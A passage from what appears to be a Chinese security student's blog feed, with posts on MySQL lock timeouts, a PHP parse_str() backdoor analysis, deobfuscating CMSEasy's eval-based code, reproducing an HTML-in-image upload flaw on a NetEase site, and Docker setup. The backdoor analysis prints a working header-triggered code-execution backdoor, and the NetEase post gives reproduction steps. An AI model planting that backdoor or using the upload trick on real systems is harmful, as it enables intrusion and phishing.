    <content type="html"><![CDATA[<h4 id="记一次操作Mysql总是被锁的情况的处理"><a href="#记一次操作Mysql总是被锁的情况的处理" class="headerlink" title="记一次操作Mysql总是被锁的情况的处理"></a>记一次操作Mysql总是被锁的情况的处理</h4><p>还是上篇文章说的那个项目。。。</p><p>改完学姐的脚本之后好不容易给数据库打完了标签结果老师又说要新加字段</p><p>面对新来的需求，我只能用微笑来面对了(mmp)</p><p>数据总共有20-30W条，用navicat和mysql终端添加列均以失败告终</p><a id="more"></a><p>把软件卡崩溃了n次，pt-online-schema-change 神器完美的解决这样的问题。</p><p>详情 -&gt; <a href="https://segmentfault.com/a/1190000005642807" target="_blank" rel="noopener">链接</a></p><p>尼玛，自从上次停电之后操作数据库总是莫名其妙被锁表</p><p>这样会导致针对此表只能 select 而不能修改</p><h4 id="在网上查了一些解决方案，发现一种治标不治本的："><a href="#在网上查了一些解决方案，发现一种治标不治本的：" class="headerlink" title="在网上查了一些解决方案，发现一种治标不治本的："></a>在网上查了一些解决方案，发现一种治标不治本的：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">processlist</span> #(这是我接这个项目之后用得最熟练的语句)</span><br><span class="line"></span><br><span class="line"><span class="keyword">kill</span> <span class="keyword">ID</span>#由上一步得知哪些操作<span class="keyword">sleep</span>了但是没有执行，统统<span class="keyword">kill</span>掉</span><br></pre></td></tr></table></figure><p>但是下一次如果操作过于猛烈仍然会被锁！</p><p>用脚本跑几下，直接被锁 + 报错 <code>ERROR 1205 (HY000): Lock wait timeout exceeded; try restarting transaction</code></p><p>尝试了几次，一运行脚本就开始在navicat查询界面运行<code>select * from innodb_trx --+ 或者 innodb_locks</code></p><p>这样可以“动态地”看到你的请求慢慢被锁的过程</p><p>DBA可以通过这种方法快速找到被锁的原因</p><h4 id="给出最终解决方法："><a href="#给出最终解决方法：" class="headerlink" title="给出最终解决方法："></a>给出最终解决方法：</h4><p>设置MySQL锁等待超时 <code>innodb_lock_wait_timeout=50 ，autocommit=on</code></p><p>确保脚本每一个execute后都有一个commit</p><p>之后经过几次调试我的脚本没问题了(select+insert+update)，但是学姐的脚本还是跑不动</p><p>她也是负责打标签，按理说不应该啊</p><p>后来另外一个同学 @fy 帮她看了看脚本，原来update 的条件语句是搜索字符串(如 where name = ‘xxxx’) </p><p>这样即使是解锁了，也会很慢，大量请求可能导致再次被锁</p><p>而我是用id来定位行来处理，后来fy帮学姐改了脚本，搞定！</p><p>总算是完成了，希望别再改需求了！</p><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>1.第一次接触几十万数据的处理，有点知识储备不足了，DBA工资高头发少还是有原因的。<br>2.希望下次能尝试新兴数据库吧，比如mongodb啥的。<br>3.sql语句写法和功能真的太多了，继续跟进学习！</p><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料:"></a>参考资料:</h4><p><a href="https://my.oschina.net/quanzhong/blog/222091" target="_blank" rel="noopener">记一次处理MySql锁等待（Lock wait timeout exceeded</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;记一次操作Mysql总是被锁的情况的处理&quot;&gt;&lt;a href=&quot;#记一次操作Mysql总是被锁的情况的处理&quot; class=&quot;headerlink&quot; title=&quot;记一次操作Mysql总是被锁的情况的处理&quot;&gt;&lt;/a&gt;记一次操作Mysql总是被锁的情况的处理&lt;/h4&gt;&lt;p&gt;还是上篇文章说的那个项目。。。&lt;/p&gt;
&lt;p&gt;改完学姐的脚本之后好不容易给数据库打完了标签结果老师又说要新加字段&lt;/p&gt;
&lt;p&gt;面对新来的需求，我只能用微笑来面对了(mmp)&lt;/p&gt;
&lt;p&gt;数据总共有20-30W条，用navicat和mysql终端添加列均以失败告终&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PHP函数之parse_str()</title>
    <link href="http://blog.recorday.cn/2018/03/04/PHP-parse-str/"/>
    <id>http://blog.recorday.cn/2018/03/04/PHP-parse-str/</id>
    <published>2018-03-04T10:15:16.000Z</published>
    <updated>2018-03-04T12:49:34.438Z</updated>
    
    <content type="html"><![CDATA[<p>今天看到一个后门，自己看了一会儿并没有认出怎么用，后来查找资料复现执行了一下，记录一下：</p><p>后门是这样的：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span> php</span></span><br><span class="line"><span class="php">$opt_x = $_SERVER[<span class="string">'HTTP_X'</span>]; </span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(strlen($opt_x)&gt;<span class="number">20</span>) &#123; </span></span><br><span class="line"><span class="php">parse_str($opt_x); </span></span><br><span class="line"><span class="php">$cfg($opt); </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><a id="more"></a><p>首先给$opt_x传入$_SERVER[‘HTTP_X’]（在http头传输X: xxxx 就可以了）</p><p>如果长度大于20，则执行parse_str($opt_x)</p><p>parse_str()的作用是把传入的字符串解析成多个变量</p><p>之后就可以通过这个变量覆盖$cfg和$opt,执行任意代码了。</p><p>这波骚操作两个点，分别说一下：</p><h4 id="1-SERVER-HTTP-XXXXXX"><a href="#1-SERVER-HTTP-XXXXXX" class="headerlink" title="1.$SERVER[HTTP_XXXXXX]"></a>1.$SERVER[HTTP_XXXXXX]</h4><p>经过测试，将XXXX替换成任意大写英文都可以实现通过自定义HTTP头传参，以前没怎么注意过，还以为是改了中间件配置才实现的。</p><h4 id="2-parse-str-函数"><a href="#2-parse-str-函数" class="headerlink" title="2.parse_str()函数"></a>2.parse_str()函数</h4><p><code>void parse_str ( string $encoded_string [, array &amp;$result ] )</code></p><p>如果 encoded_string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代。</p><p>自己根据功能写了一个简易版的parse_str()函数</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">Myparse_str</span><span class="params">($encode)</span></span>&#123;</span></span><br><span class="line"><span class="php"><span class="comment">//判断参数是否符合要求</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($encode==<span class="string">''</span>||strpos($encode,<span class="string">"="</span>)==<span class="keyword">false</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">return</span> <span class="keyword">null</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">//确定变量数量,用于处理多个变量需求</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(strpos($encode,<span class="string">"&amp;"</span>)!==<span class="keyword">false</span> )</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">$encode=explode(<span class="string">"&amp;"</span>,$encode);</span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span> ($encode <span class="keyword">as</span> $param)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="comment">//限制两个数组，避免多个等号的情况</span></span></span><br><span class="line"><span class="php">$param=explode(<span class="string">"="</span>,$param,<span class="number">2</span>);</span></span><br><span class="line"><span class="php">$GLOBALS[$param[<span class="number">0</span>]]=$param[<span class="number">1</span>];</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">//单一变量转换</span></span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">$encode=explode(<span class="string">"="</span>,$encode,<span class="number">2</span>);</span></span><br><span class="line"><span class="php">    $GLOBALS[$encode[<span class="number">0</span>]]=$encode[<span class="number">1</span>];</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h5 id="感想"><a href="#感想" class="headerlink" title="感想:"></a>感想:</h5><p>php真是神奇的语言啊，一个超全局变量不仅名字霸气功能也方便，简单粗暴exciting!</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天看到一个后门，自己看了一会儿并没有认出怎么用，后来查找资料复现执行了一下，记录一下：&lt;/p&gt;
&lt;p&gt;后门是这样的：&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?&lt;/span&gt; php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;$opt_x = $_SERVER[&lt;span class=&quot;string&quot;&gt;&#39;HTTP_X&#39;&lt;/span&gt;]; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(strlen($opt_x)&amp;gt;&lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;) &amp;#123; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;	parse_str($opt_x); &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;	$cfg($opt); &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>初审cmseasy之 基本解混淆</title>
    <link href="http://blog.recorday.cn/2018/03/02/cmseasy01/"/>
    <id>http://blog.recorday.cn/2018/03/02/cmseasy01/</id>
    <published>2018-03-02T09:04:51.000Z</published>
    <updated>2018-03-02T09:08:27.784Z</updated>
    
    <content type="html"><![CDATA[<p>看了一下lib目录下所有代码都是被混淆过了，可能是开发人员想过滤掉初级无脑扫描分析工具吧</p><p>不解密的话代码都看不到，不知道解密完了能不能发现一些好玩的东西。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/03/02/cmseasy01/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>分析混淆代码不难发现，每一个文件后面都是加密的原始源码</p><a id="more"></a><p>经过层层替换：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$o00o=$file_get_contents(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$o00o=substr(str_replace(substr($o00o,<span class="number">0</span>,<span class="number">2054</span>),<span class="string">''</span>,$o00o),<span class="number">0</span>,<span class="number">-2</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">eval</span>(gzinflate(base64_decode($o00o)));</span></span><br></pre></td></tr></table></figure><p>此时可以看到，这段代码的含义是读取自身文件，并且将前面2054个字符和最后2个（注释符）替换掉，从而得到gzinflate(base64_encode)的字符串</p><p>并且通过eval(解密) 进行执行,化简完的代码:</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/03/02/cmseasy01/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>还原后可以进一步查看能否在eval函数中搞一点事情</p><p>按它给的方法进行文件内容处理</p><p>之后再把执行的函数换成echo，这个时候就可以迈过这个坎儿，进行下一步的审计了。</p><p>用php写个脚本跑了单个文件，成功了，随后可以批量解密，这个时候py脚本还得调用php,就不如直接撸php脚本解密快了。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/03/02/cmseasy01/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/03/02/cmseasy01/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>最终批量检测还原代码效果(自动遍历文件并检测解密)：</p><p>test.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/03/02/cmseasy01/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>天呐，终于完善了这个无聊之作，解密脚本就不发了，练习php之作比较笨拙</p><hr><p>最后附上解密代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$content=file_get_contents(<span class="string">'1.txt'</span>);</span></span><br><span class="line"><span class="php">$next=substr(str_replace(substr($content,<span class="number">0</span>,<span class="number">2054</span>),<span class="string">''</span>,$content),<span class="number">0</span>,<span class="number">-2</span>);</span></span><br><span class="line"><span class="php">$content=gzinflate(base64_decode($next));</span></span><br><span class="line"><span class="php">file_put_contents(<span class="string">'1.txt'</span>,$content);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h4 id="总结：不要死认准一种语言coding，有时候php比py好用得多"><a href="#总结：不要死认准一种语言coding，有时候php比py好用得多" class="headerlink" title="总结：不要死认准一种语言coding，有时候php比py好用得多"></a>总结：不要死认准一种语言coding，有时候php比py好用得多</h4>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;看了一下lib目录下所有代码都是被混淆过了，可能是开发人员想过滤掉初级无脑扫描分析工具吧&lt;/p&gt;
&lt;p&gt;不解密的话代码都看不到，不知道解密完了能不能发现一些好玩的东西。&lt;/p&gt;
&lt;figure class=&quot;image-bubble&quot;&gt;
                &lt;div class=&quot;img-lightbox&quot;&gt;
                    &lt;div class=&quot;overlay&quot;&gt;&lt;/div&gt;
                    &lt;img src=&quot;/2018/03/02/cmseasy01/1.png&quot; alt=&quot;&quot; title=&quot;&quot;&gt;
                &lt;/div&gt;
                &lt;div class=&quot;image-caption&quot;&gt;&lt;/div&gt;
            &lt;/figure&gt;
&lt;p&gt;分析混淆代码不难发现，每一个文件后面都是加密的原始源码&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>网易图片解析为html漏洞复现</title>
    <link href="http://blog.recorday.cn/2018/02/28/neteast-jpg-react/"/>
    <id>http://blog.recorday.cn/2018/02/28/neteast-jpg-react/</id>
    <published>2018-02-28T13:44:08.000Z</published>
    <updated>2018-02-28T14:18:15.633Z</updated>
    
    <content type="html"><![CDATA[<p>昨天看到吐司上面有人发了篇帖子，大概讲的是 楼主发现了搜狗和网易有某种漏洞，上传的图片可以解析图片文件中夹带的js代码</p><p>果然吐司大牛如云，下面马上就有人回帖贴出了一个网易的地址，打开就弹窗了。。。</p><p>于是看着大家的讨论，自己也复现了一波：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/02/28/neteast-jpg-react/163alert.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p><a href="http://hi-163-common.nosdn.127.net/upload/201802/28/a47399601c7911e8ae21717dc0d1d8bd" target="_blank" rel="noopener">测试复现地址</a></p><a id="more"></a><p>首先去网易某分站注册，找到上传图片的入口，打开burp抓包</p><p>新建一个文件，输入html代码保存为图片格式并上传</p><p>将<code>Content-type:text/plain</code>修改成<code>Content-type:text/html</code></p><p>这样浏览器在识别这样的文件后会调用html解析器对文件进行解析</p><p>整理一下相关知识吧：</p><h5 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h5><p> MediaType，即是Internet Media Type，互联网媒体类型；也叫做MIME类型，在Http协议消息头中，使用Content-Type来表示具体请求中的媒体类型信息。<br> Content-type 告诉用户浏览器如何显示或者解析将要加载的数据文件</p><h5 id="常见的媒体格式类型如下："><a href="#常见的媒体格式类型如下：" class="headerlink" title="常见的媒体格式类型如下："></a>常见的媒体格式类型如下：</h5><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">text</span>/html ： HTML格式</span><br><span class="line"><span class="built_in">text</span>/plain ：纯文本格式     </span><br><span class="line"><span class="built_in">text</span>/xml ：  <span class="keyword">XML</span>格式</span><br><span class="line"><span class="built_in">image</span>/gif ：gif图片格式   </span><br><span class="line"><span class="built_in">image</span>/jpeg ：jpg图片格式</span><br><span class="line"><span class="built_in">image</span>/png：png图片格式</span><br></pre></td></tr></table></figure><p>一些小伙伴叫这个 ‘xss’，而我感觉这更像是文件上传缺陷。</p><p>涉及的危害我想包括但不限于: 群发广告(毕竟是大站的域名，应该自带白名单)，钓鱼诈骗，剩下的盗取cookie什么的如果开启了http-only,同源策略，内容安全策略限制的好应该很难利用吧233。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;昨天看到吐司上面有人发了篇帖子，大概讲的是 楼主发现了搜狗和网易有某种漏洞，上传的图片可以解析图片文件中夹带的js代码&lt;/p&gt;
&lt;p&gt;果然吐司大牛如云，下面马上就有人回帖贴出了一个网易的地址，打开就弹窗了。。。&lt;/p&gt;
&lt;p&gt;于是看着大家的讨论，自己也复现了一波：&lt;/p&gt;
&lt;figure class=&quot;image-bubble&quot;&gt;
                &lt;div class=&quot;img-lightbox&quot;&gt;
                    &lt;div class=&quot;overlay&quot;&gt;&lt;/div&gt;
                    &lt;img src=&quot;/2018/02/28/neteast-jpg-react/163alert.png&quot; alt=&quot;&quot; title=&quot;&quot;&gt;
                &lt;/div&gt;
                &lt;div class=&quot;image-caption&quot;&gt;&lt;/div&gt;
            &lt;/figure&gt;
&lt;p&gt;&lt;a href=&quot;http://hi-163-common.nosdn.127.net/upload/201802/28/a47399601c7911e8ae21717dc0d1d8bd&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;测试复现地址&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://blog.recorday.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>HappyNewYear</title>
    <link href="http://blog.recorday.cn/2018/02/15/HappyNewYear/"/>
    <id>http://blog.recorday.cn/2018/02/15/HappyNewYear/</id>
    <published>2018-02-15T10:52:34.000Z</published>
    <updated>2018-02-28T13:42:26.400Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2018狗年大吉！"><a href="#2018狗年大吉！" class="headerlink" title="2018狗年大吉！"></a>2018狗年大吉！</h1><h4 id="年前重制了自己的作品demo-并且录了一句人声，这大概是我做的最无聊的一件事了，算是一个新年礼物送给自己。"><a href="#年前重制了自己的作品demo-并且录了一句人声，这大概是我做的最无聊的一件事了，算是一个新年礼物送给自己。" class="headerlink" title="年前重制了自己的作品demo,并且录了一句人声，这大概是我做的最无聊的一件事了，算是一个新年礼物送给自己。"></a>年前重制了自己的作品demo,并且录了一句人声，这大概是我做的最无聊的一件事了，算是一个新年礼物送给自己。</h4><a id="more"></a><p><a href="NewDemo.mp3">点击试听或下载</a></p><h4 id="最后祝大家新年快乐，多陪陪家人！希望自己在新的一年不要浮躁，潜心研究技术，用心玩出好的音乐！"><a href="#最后祝大家新年快乐，多陪陪家人！希望自己在新的一年不要浮躁，潜心研究技术，用心玩出好的音乐！" class="headerlink" title="最后祝大家新年快乐，多陪陪家人！希望自己在新的一年不要浮躁，潜心研究技术，用心玩出好的音乐！"></a>最后祝大家新年快乐，多陪陪家人！希望自己在新的一年不要浮躁，潜心研究技术，用心玩出好的音乐！</h4><h4 id="希望自己在新的一年不要浮躁，潜心研究技术，用心玩出好的音乐！"><a href="#希望自己在新的一年不要浮躁，潜心研究技术，用心玩出好的音乐！" class="headerlink" title="希望自己在新的一年不要浮躁，潜心研究技术，用心玩出好的音乐！"></a>希望自己在新的一年不要浮躁，潜心研究技术，用心玩出好的音乐！</h4>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;2018狗年大吉！&quot;&gt;&lt;a href=&quot;#2018狗年大吉！&quot; class=&quot;headerlink&quot; title=&quot;2018狗年大吉！&quot;&gt;&lt;/a&gt;2018狗年大吉！&lt;/h1&gt;&lt;h4 id=&quot;年前重制了自己的作品demo-并且录了一句人声，这大概是我做的最无聊的一件事了，算是一个新年礼物送给自己。&quot;&gt;&lt;a href=&quot;#年前重制了自己的作品demo-并且录了一句人声，这大概是我做的最无聊的一件事了，算是一个新年礼物送给自己。&quot; class=&quot;headerlink&quot; title=&quot;年前重制了自己的作品demo,并且录了一句人声，这大概是我做的最无聊的一件事了，算是一个新年礼物送给自己。&quot;&gt;&lt;/a&gt;年前重制了自己的作品demo,并且录了一句人声，这大概是我做的最无聊的一件事了，算是一个新年礼物送给自己。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hello,Docker</title>
    <link href="http://blog.recorday.cn/2018/01/26/Hello-Docker/"/>
    <id>http://blog.recorday.cn/2018/01/26/Hello-Docker/</id>
    <published>2018-01-26T10:45:23.000Z</published>
    <updated>2018-01-27T10:46:29.771Z</updated>
    
    <content type="html"><![CDATA[<h1 id="倚天屠龙Docker部署记"><a href="#倚天屠龙Docker部署记" class="headerlink" title="倚天屠龙Docker部署记"></a>倚天屠龙Docker部署记</h1><p>很久以前就听@LYZ说过Docker,最近要办HITCTF了才想起来要学习，记录一下环境的部署</p><h3 id="采用环境："><a href="#采用环境：" class="headerlink" title="采用环境："></a>采用环境：</h3><h5 id="腾讯云VPS-ubuntu16-04-MobaXtern-SSH管理工具"><a href="#腾讯云VPS-ubuntu16-04-MobaXtern-SSH管理工具" class="headerlink" title="腾讯云VPS(ubuntu16.04) + MobaXtern(SSH管理工具)"></a>腾讯云VPS(ubuntu16.04) + MobaXtern(SSH管理工具)</h5><p>首先贴一份docker安装脚本，保存为docker.sh传到服务器上，sudo运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">sudo apt-get -y update &amp;&amp; apt -y upgrade</span><br><span class="line">sudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common</span><br><span class="line"><span class="comment">#添加Docker官方GPG公钥</span></span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line">sudo add-apt-repository \</span><br><span class="line">   <span class="string">"deb [arch=amd64] https://download.docker.com/linux/ubuntu <span class="variable">$(lsb_release -cs)</span> edge"</span></span><br><span class="line">sudo apt-get -y update</span><br><span class="line">sudo apt-get -y install docker-ce</span><br><span class="line">curl -L https://github.com/docker/compose/releases/download/1.18.0/docker-compose-`uname -s`-`uname -m` -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line">chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure><a id="more"></a><p>接着出现一系列更新，都敲回车一路过来，直到完成,输入docker -v 查看版本</p><p>如果回显正常那么恭喜你docker环境配置完成了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/01/26/Hello-Docker/install.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h4 id="一些配置时用到的基本命令-使用前请加sudo-："><a href="#一些配置时用到的基本命令-使用前请加sudo-：" class="headerlink" title="一些配置时用到的基本命令(使用前请加sudo)："></a>一些配置时用到的基本命令(使用前请加sudo)：</h4><h5 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h5><p><code>docker images ls</code></p><h5 id="查看容器"><a href="#查看容器" class="headerlink" title="查看容器"></a>查看容器</h5><p><code>docker container ls</code></p><h5 id="停止运行的容器"><a href="#停止运行的容器" class="headerlink" title="停止运行的容器"></a>停止运行的容器</h5><p><code>docker stop id</code></p><h5 id="移除容器"><a href="#移除容器" class="headerlink" title="移除容器"></a>移除容器</h5><p><code>docker rm id</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2018/01/26/Hello-Docker/install2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h5 id="远程获取ubuntu16-04"><a href="#远程获取ubuntu16-04" class="headerlink" title="远程获取ubuntu16.04"></a>远程获取ubuntu16.04</h5><p><code>docker pull ubuntu:16.04</code></p><h5 id="从本地的dockerfile启动容器"><a href="#从本地的dockerfile启动容器" class="headerlink" title="从本地的dockerfile启动容器"></a>从本地的dockerfile启动容器</h5><p><code>docker-compose -f local_db.yml up -d --build</code></p><h5 id="获取当前容器运行日志"><a href="#获取当前容器运行日志" class="headerlink" title="获取当前容器运行日志"></a>获取当前容器运行日志</h5><p><code>docker-compose -f 配置文件 logs --tail all</code></p><h5 id="docker跑起来时，暂停-恢复："><a href="#docker跑起来时，暂停-恢复：" class="headerlink" title="docker跑起来时，暂停/恢复："></a>docker跑起来时，暂停/恢复：</h5><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pause <span class="built_in">id</span></span><br><span class="line">docker unpause <span class="built_in">id</span></span><br></pre></td></tr></table></figure><h4 id="值得注意："><a href="#值得注意：" class="headerlink" title="值得注意："></a>值得注意：</h4><p>当你有一个容器在跑mysql服务，将3306端口映射到主机上时，再启动一个容器就要小心端口占用的问题了。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;倚天屠龙Docker部署记&quot;&gt;&lt;a href=&quot;#倚天屠龙Docker部署记&quot; class=&quot;headerlink&quot; title=&quot;倚天屠龙Docker部署记&quot;&gt;&lt;/a&gt;倚天屠龙Docker部署记&lt;/h1&gt;&lt;p&gt;很久以前就听@LYZ说过Docker,最近要办HITCTF了才想起来要学习，记录一下环境的部署&lt;/p&gt;
&lt;h3 id=&quot;采用环境：&quot;&gt;&lt;a href=&quot;#采用环境：&quot; class=&quot;headerlink&quot; title=&quot;采用环境：&quot;&gt;&lt;/a&gt;采用环境：&lt;/h3&gt;&lt;h5 id=&quot;腾讯云VPS-ubuntu16-04-MobaXtern-SSH管理工具&quot;&gt;&lt;a href=&quot;#腾讯云VPS-ubuntu16-04-MobaXtern-SSH管理工具&quot; class=&quot;headerlink&quot; title=&quot;腾讯云VPS(ubuntu16.04) + MobaXtern(SSH管理工具)&quot;&gt;&lt;/a&gt;腾讯云VPS(ubuntu16.04) + MobaXtern(SSH管理工具)&lt;/h5&gt;&lt;p&gt;首先贴一份docker安装脚本，保存为docker.sh传到服务器上，sudo运行&lt;/p&gt;
